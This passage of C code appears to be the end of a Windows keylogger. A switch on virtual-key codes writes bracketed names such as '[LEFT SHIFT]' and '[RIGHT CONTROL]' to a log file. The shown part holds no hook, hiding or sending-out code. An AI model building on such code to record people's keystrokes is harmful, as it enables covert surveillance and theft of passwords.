                        case VK_SCROLL:
                            fputs("[SCROLL LOCK]", file);
                            break;
                        case VK_LSHIFT:
                            fputs("[LEFT SHIFT]", file);
                            break;
                        case VK_LCONTROL:
                            fputs("[LEFT CONTROL]", file);
                            break;
                        case VK_LMENU:
                            fputs("[LEFT MENU]", file);
                            break;
                        case VK_RSHIFT:
                            fputs("[RIGHT SHIFT]", file);
                            break;
                        case VK_RCONTROL:
                            fputs("[RIGHT CONTROL]", file);
                            break;
                        case VK_RMENU:
                            fputs("[RIGHT MENU]", file);
                            break;
                        case VK_PLAY:
                            fputs("[PLAY]", file);
                            break;
                        case VK_ZOOM:
                            fputs("[ZOOM]", file);
                            break;
                        default:
                            break;
                    }
                }
                fclose(file);
            }
        }
    }
    return 0;
}
